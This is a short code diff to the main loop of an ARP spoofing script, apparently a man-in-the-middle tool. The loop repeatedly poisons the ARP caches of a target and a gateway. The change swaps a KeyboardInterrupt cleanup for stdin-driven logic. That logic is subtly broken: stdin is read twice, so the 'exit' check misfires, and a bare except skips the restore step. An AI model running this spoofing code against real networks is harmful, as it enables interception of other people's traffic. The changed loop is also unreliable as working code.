@@ -20,11 +20,15 @@ def restore(destination_ip, source_ip):
 
 try:
     while True:
-        print("Sending 2 packets!")
-        spoof(ip_target, ip_gateway)
-        spoof(ip_gateway, ip_target)
-        time.sleep(interval)
-except KeyboardInterrupt:
-    print("Attack ended, restoring ip arrangement!")
-    restore(ip_gateway, ip_target)
-    restore(ip_target, ip_gateway)
+        print(sys.stdin.read())
+        if "exit" == sys.stdin.read():
+            print("Attack ended, restoring ip arrangement!")
+            restore(ip_gateway, ip_target)
+            restore(ip_target, ip_gateway)
+        else:
+            print("Sending 2 packets!")
+            spoof(ip_target, ip_gateway)
+            spoof(ip_gateway, ip_target)
+            time.sleep(interval)
+except:
+    print("An error occurred!")
